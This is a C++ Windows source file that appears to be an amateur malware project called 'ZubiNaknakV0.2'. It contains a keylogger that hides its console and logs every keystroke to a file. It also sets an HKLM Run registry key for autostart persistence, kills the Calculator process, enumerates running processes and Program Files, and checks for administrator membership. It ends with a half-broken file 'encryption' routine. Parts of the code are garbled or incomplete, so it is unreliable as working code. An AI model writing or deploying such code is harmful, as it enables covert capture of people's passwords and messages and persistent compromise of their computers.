#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <strsafe.h>
#include <tchar.h>
#include <list>




#pragma comment(lib,"advapi32.lib")
#define MAX_NAME 256
using namespace std;
char name[30], target[30], ch, mod;
int num[100], i, option;

void WriteData(std::string Text) {
	ofstream LogFile;
	LogFile.open("Keylogs.txt", fstream::app);
	LogFile << Text.c_str();
	LogFile.close();
}

void Stealth() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

bool isKeyListed(int vKey) {
	switch (vKey) {
	case VK_RETURN:
		WriteData("\n");
		break;
	case VK_BACK:
		WriteData("\b");
		break;
	case VK_SPACE:
		WriteData(" ");
		break;
	case VK_SHIFT:
		WriteData(" *shift* ");
		break;
	case VK_OEM_PERIOD:
		WriteData(".");
		break;
	default: return false;
	}
}

void KeyLogger()
{
	Stealth();
	char Key;
	while (1) {
		for (Key = 8; Key <= 255; Key++) {
			if (GetAsyncKeyState(Key) == -32767) {
				if (isKeyListed(Key) == 0) {
					ofstream LogFile;
					LogFile.open("Keylogs.txt", fstream::app);
					LogFile << Key;
					LogFile.close();
				}
			}
		}
	}
}

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

DWORD WINAPI ThreadFun(LPVOID IpParam)
{
	return 0;
}

HANDLE C;
DWORD WINAPI A(LPVOID in)
{
	while (1)
	{
		cout << "Im pickle rickkkkk" << endl;
	}
	return 0;
}

DWORD WINAPI B(LPVOID in)
{
	while (1)
	{
		cout << "Even A .. Going to suspend" << endl;
		SuspendThread(C);
		cout << "Even B .. Resuming Thread .." << endl;
		ResumeThread(C);
	}
	return 0;
}

BOOL IsAppRunningAsAdminMode();
void Encryp();
BOOL GetDriveGeometry(DISK_GEOMETRY  *pdg);
BOOL SearchTokenGroupsForSID(VOID);

/// MAIN ///

int _tmain(int argc, _TCHAR* argv[])
{
	

	//KeyLogger();
	//////// /   request execution level . elevation /////

	HANDLE hThread;
	DWORD ThreadID;

	STARTUPINFOA siTest;
	GetStartupInfoA(&siTest);

	SYSTEM_INFO info;
	GetSystemInfo(&info);

	NTSTATUS status;
	PVOID buffer;
	PSYSTEM_PROCESS_INFO spi;

	DISK_GEOMETRY pdg;            // disk drive geometry structure
	BOOL bResult;                            // generic results flag
	ULONGLONG DiskSize;           // size of the drive, in bytes

	FILE* pFile;

	//if (IsAppRunningAsAdminMode())
		//printf("\n Admin is OK TO GO !!!! \n");






#pragma region Registry
	// reg autorun
	LPCWSTR str1 = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	LPCWSTR str2 = TEXT("ZubiNaknakReg");
	HKEY hkey;
	LONG RegOpenResult;
	LPCWSTR PATH = L"C:\\Users\\user\\source\\repos\\ZubiNaknakV0.2\\Debug\\ZubiNaknakV0.2.exe";
	RegOpenResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, str1, 0, KEY_ALL_ACCESS, &hkey);
	RegSetValueEx(hkey, str2, 0, REG_SZ, (LPBYTE)PATH, _tcslen(TEXT("C:\\Users\\user\\source\\repos\\ZubiNaknakV0.2\\Debug\\ZubiNaknakV0.2.exe"))*sizeof(TCHAR)) ;
	RegCloseKey(hkey);
#pragma endregion


#pragma region Terminate Calc
	// find process & terminate
	HWND hCalc = FindWindow(nullptr, L"Calculator");
	if (hCalc == nullptr)
	{
		printf("No calc running \n");
		
	}
	DWORD pid;
	DWORD tid = GetWindowThreadProcessId(hCalc, &pid);
	HANDLE hProcess = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, FALSE, pid);
	if (hProcess)
	{
		Sleep(3000);
		if (TerminateProcess(hProcess, 0))
		{
			WaitForSingleObject(hProcess, INFINITE);
			printf("Calc terminated. \n");
		}
		else
		{
			printf("Error: %d\n", GetLastError());

		}
		CloseHandle(hProcess);
	}
#pragma endregion



#pragma region CreateThread

	hThread = CreateThread(NULL, 0, ThreadFun, NULL, 0, &ThreadID);

	//C = CreateThread(NULL, 0, A, NULL, 0, NULL);
	//CreateThread(NULL, 0, B, NULL, 0, NULL);
	//cout << "After Suspend and Resume" << endl;


	if (hThread == NULL)
		cout << "Thread Failed" << endl;

	cout << "Thread Creation sucess" << endl;
	SuspendThread(hThread);
	cout << "After Suspend " << endl;
	ResumeThread(hThread);
	cout << "After  Resume" << endl;

	CloseHandle(hThread);




#pragma endregion


#pragma region IOControl
	printf("\n");
	printf("TEESTTTTTTTT\n");
	printf("\n");
	

	bResult = GetDriveGeometry(&pdg);

	if (bResult)
	{
		printf("Cylinders = %I64d\n", pdg.Cylinders);
		printf("Tracks/cylinder = %ld\n", (ULONG)pdg.TracksPerCylinder);
		printf("Sectors/track = %ld\n", (ULONG)pdg.SectorsPerTrack);
		printf("Bytes/sector = %ld\n", (ULONG)pdg.BytesPerSector);
		DiskSize = pdg.Cylinders.QuadPart * (ULONG)pdg.TracksPerCylinder *(ULONG)pdg.SectorsPerTrack * (ULONG)pdg.BytesPerSector;
		printf("Disk size = %I64d (Bytes) = %I64d (Gb)\n", DiskSize, DiskSize / (1024 * 1024 * 1024));
	}
	else
	{
		printf("GetDriveGeometry() failed. Error %ld.\n", GetLastError());
	}
	//return ((int)bResult);
	printf("TEESTTTTTTTT\n");
	printf("\n");


#pragma region TokenShit
	printf("BeforeTOKENNNN\n");
	printf("\n");
	SearchTokenGroupsForSID();
	printf("After TokeNNNN\n");
	printf("\n");
#pragma endregion

#pragma endregion


#pragma region Recon

	//testing SystemInfo / StartupInfo 	
	cout << "Info proc type: " << info.dwProcessorType << endl;
	cout << "Info num of procs: " << info.dwNumberOfProcessors << endl;


	cout << "SiTest dwFileAtt :  " << siTest.dwFillAttribute << endl;
	cout << "SiTest Flags: " << siTest.dwFlags << endl;

	// creating process and opening notepad
	TCHAR name[] = _T("notepad");
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	BOOL success = CreateProcess(nullptr, name, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

	if (!success)
	{
		return 1;
	}

	cout << "PID:  " << pi.dwProcessId << endl;

	cout << "hProcess :  " << pi.hProcess << endl;;

	WaitForSingleObject(pi.hProcess, 0);
	DWORD code;
	GetExitCodeProcess(pi.hProcess, &code);
	cout << "Notepad has exited. Exit code =" << code << endl;


	/////// Get all Proccess that running ATM //////////////

	buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// We need to allocate a large buffer because the process list can be large.

	if (!buffer)
	{
		printf("\nError: Unable to allocate memory for process list (%d)\n", GetLastError());
		return -1;
	}

	printf("\nProcess list allocated at address %#x\n", buffer);
	spi = (PSYSTEM_PROCESS_INFO)buffer;

	if (!NT_SUCCESS(status = NtQuerySystemInformation(SystemProcessInformation, spi, 1024 * 1024, NULL)))
	{
		printf("\nError: Unable to query process list (%#x)\n", status);

		VirtualFree(buffer, 0, MEM_RELEASE);
		return -1;
	}
	std::wofstream outfile("test.txt");

	struct PidEntry
	{
		HANDLE Pid;
		std::wstring ImageName;
	};

	std::list<PidEntry> pid_list;

	while (spi->NextEntryOffset)
	{
		auto pid = spi->ProcessId;
		if (pid)
		{
			std::wstring name(spi->ImageName.Buffer);
			PidEntry entry = { pid, name };
			pid_list.push_back(entry);
		}

		printf("\nProcess name: %ws | Process ID: %d\n", spi->ImageName.Buffer, spi->ProcessId);
		spi = (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset);
	}

	for (auto &entry : pid_list)
		outfile << (unsigned long long)entry.Pid << " " << entry.ImageName.c_str() << std::endl;
	outfile.close();



	printf("\nPress any key to continue.\n");
	


	

	VirtualFree(buffer, 0, MEM_RELEASE);

	LPCTSTR old = TEXT("test.txt");
	LPCTSTR copy = TEXT("New.txt");
	



	///////////////////////////////////

	printf("halohalo \n");
#pragma endregion

#pragma region FindNext


	static const char* chFolderpath = "C:\\Program Files\\*";
	string data;

	HANDLE hFind;
	WIN32_FIND_DATAA data2;
	hFind = FindFirstFileA(chFolderpath, &data2);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (data2.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
				data += "<DIR>";

			data += data2.cFileName;
			data += '\n';
		} while (FindNextFileA(hFind, &data2));

		FindClose(hFind);
	}
	cout << data;
	Sleep(3000);
	system("PAUSE");
	return EXIT_SUCCESS;

#pragma endregion

	
	getchar();

	return 0;

}


//// END OF MAIN ///


BOOL GetDriveGeometry(DISK_GEOMETRY *pdg)

{

	HANDLE hDevice;               // handle to the drive to be examined
	BOOL bResult;                 // results flag
	DWORD junk;                   // discard results
	hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"),  // drive to open
		0,                // no access to the drive
		FILE_SHARE_READ | // share mode
		FILE_SHARE_WRITE,
		NULL,             // default security attributes
		OPEN_EXISTING,    // disposition
		0,               // file attributes
		NULL);            // do not copy file attribute

	if (hDevice == INVALID_HANDLE_VALUE) // cannot open the driv
	{
		printf("CreateFile() failed!\n");
		return (FALSE);
	}



	bResult = DeviceIoControl(hDevice,  // device to be queried
		IOCTL_DISK_GET_DRIVE_GEOMETRY,  // operation to perform
		NULL, 0, // no input buffer
		pdg, sizeof(*pdg),     // output buffer
		&junk,                 // # bytes returned
		(LPOVERLAPPED)NULL);  // synchronous I/O
	CloseHandle(hDevice);
	return (bResult);

}

BOOL SearchTokenGroupsForSID (VOID) 
{
    DWORD i, dwSize = 0, dwResult = 0;
    HANDLE hToken;
    PTOKEN_GROUPS pGroupInfo;
    SID_NAME_USE SidType;
    //char lpName[MAX_NAME];
	WCHAR lpName[MAX_PATH] = { 0 };
    //char lpDomain[MAX_NAME];
	WCHAR lpDomain[MAX_PATH] = { 0 };
    PSID pSID = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
       
    // Open a handle to the access token for the calling process.

    if (!OpenProcessToken( GetCurrentProcess(), TOKEN_QUERY, &hToken )) 
    {
        printf( "OpenProcessToken Error %u\n", GetLastError() );
        return FALSE;
    }

    // Call GetTokenInformation to get the buffer size.

    if(!GetTokenInformation(hToken, TokenGroups, NULL, dwSize, &dwSize)) 
    {
        dwResult = GetLastError();
        if( dwResult != ERROR_INSUFFICIENT_BUFFER ) {
            printf( "GetTokenInformation Error %u\n", dwResult );
            return FALSE;
        }
    }

    // Allocate the buffer.

    pGroupInfo = (PTOKEN_GROUPS) GlobalAlloc( GPTR, dwSize );

    // Call GetTokenInformation again to get the group information.

    if(! GetTokenInformation(hToken, TokenGroups, pGroupInfo, 
                            dwSize, &dwSize ) ) 
    {
        printf( "GetTokenInformation Error %u\n", GetLastError() );
        return FALSE;
    }

    // Create a SID for the BUILTIN\Administrators group.

    if(! AllocateAndInitializeSid( &SIDAuth, 2,
                     SECURITY_BUILTIN_DOMAIN_RID,
                     DOMAIN_ALIAS_RID_ADMINS,
                     0, 0, 0, 0, 0, 0,
                     &pSID) ) 
    {
        printf( "AllocateAndInitializeSid Error %u\n", GetLastError() );
        return FALSE;
    }

    // Loop through the group SIDs looking for the administrator SID.

    for(i=0; i<pGroupInfo->GroupCount; i++) 
    {
        if ( EqualSid(pSID, pGroupInfo->Groups[i].Sid) ) 
        {

            // Lookup the account name and print it.

            dwSize = MAX_NAME;
            if( !LookupAccountSid( NULL, pGroupInfo->Groups[i].Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType))
                                  
            {
                dwResult = GetLastError();
                if( dwResult == ERROR_NONE_MAPPED )
                   wcscpy_s (lpName, dwSize, L"NONE_MAPPED" );
                else 
                {
                    printf("LookupAccountSid Error %u\n", GetLastError());
                    return FALSE;
                }
            }
            printf( "Current user is a member of the %s\\%s group\n", 
                    lpDomain, lpName );

            // Find out whether the SID is enabled in the token.
            if (pGroupInfo->Groups[i].Attributes & SE_GROUP_ENABLED)
                printf("The group SID is enabled.\n");
            else if (pGroupInfo->Groups[i].Attributes & 
                              SE_GROUP_USE_FOR_DENY_ONLY)
                printf("The group SID is a deny-only SID.\n");
            else 
                printf("The group SID is not enabled.\n");
        }
    }

    if (pSID)
        FreeSid(pSID);
    if ( pGroupInfo )
        GlobalFree( pGroupInfo );
    return TRUE;
}

BOOL IsAppRunningAsAdminMode()
{
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	// Allocate and initialize a SID of the administrators group.
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&pAdministratorsGroup))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	// Determine whether the SID of administrators group is enabled in 
	// the primary access token of the process.
	if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

Cleanup:

	if (pAdministratorsGroup)
	{
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	// Throw the error if something failed in the function.
	if (ERROR_SUCCESS != dwError)
	{
		throw dwError;
	}

	return fIsRunAsAdmin;
}

//void Encryp()
{

	                           //Declare
	
		

	cout << "Enter Your Option ";
	cout << "1. To Encrypt The File ";		
	cout << "2. To Decrypt The File ";
	cout << "Option : ";
		
		cin >> option;

	if (option == 1)
	{

		cout << "Enter The Path Of A File Which Is To Be Encrypted : ";
		cin >> name;
		//name = "C:\\Users\\Win10\\Desktop\\ZubiNaknakV0.2 (4)\\ZubiNaknakV0.2\\ZubiNaknakV0.2\\Keylogs.txt"

		ifstream fin(name, ios::binary);                              //Open The Input File In A Binary Mode
		
			if (!fin)
			{                                                          //Show Occur If File Does Not Exist
				
					
					cout << "Error In Openinig Of A File : ";
					              
					return;
			}

		cout << "Enter The New Encrypted File Name : ";
			
		cin >> target;

		ofstream fout(target, ios::binary);                         //Open TheOutPut File In A Binary Mode
		
			if (!fout)
			{
				cout << "Error In Opening Of Target File : ";            //Show Error If Any Error Occrs In Opening Of A File
					
					
					return ;
			}

		for (i = 0; i<9; i++)
		{                                  
				num[i] = i;                                                
			
		}

		for (i = 14; i<31; i++)                                         //Loops Will
			
		{
			num[i - 5] = i;                                              //Which Will
		
		}

		for (i = 33; i <= 68; i++)                                        //To Avoid 

		{                                                         //Enter Key 

			num[i - 7] = i;                                              //These
	
		}

		for (i = 97; i <= 122; i++)
		{
			num[i - 35] = i;
		}

		while (fin)
		{                                                       //Open The 


			if (ch == EOF)break;                                       //Exit To Loop
		

				if ((ch >= 97) && (ch <= 122))
				{                                                     //Encrypt The 	
					i = 97;
					mod = num[ch - i];
					fout << mod;
				}

			if ((ch >= 65) && (ch <= 90))
			{
				i = 39;                                                 //Encrypt The
				mod = num[ch - i];                                        //And Store In 
				fout << mod;
			}

			if ((ch >= 48) && (ch <= 57))
			{
				i = 4;                                                //Encrypt The
				mod = num[ch + i];
				fout << mod;
			}

			if ((ch == 10) || (ch == 13))
			{
				mod = ch;                                             //For Enter Key
				fout << mod;
			}

			if (ch == 32)
				fout << ch;                                             //For Space Key

			if (ch == 9)
				fout << ch;                                             //For Tab Key

			if ((ch >= 33) && (ch <= 47))
			{                                                    //For Special
				mod = ch + 64;
				fout << mod;
			}

			if ((ch >= 58) && (ch <= 64))
			{                                                    //For Special
				mod = ch + 54;
				fout << mod;
			}

			if ((ch >= 91) && (ch <= 96))
			{
				mod = ch + 28;                                          //For Special
				fout << mod;
			}

			if ((ch >= 123) && (ch <= 126))
			{
				mod = ch - 40;                                          //For Special
				fout << mod;
			}
		}

		fin.close();                                          //Close The Input
			fout.close();                                         //Close The 
		
			

			cout << "Your File Is Encrypted Now........... ";
			
			//getch();
		return ;
	}


}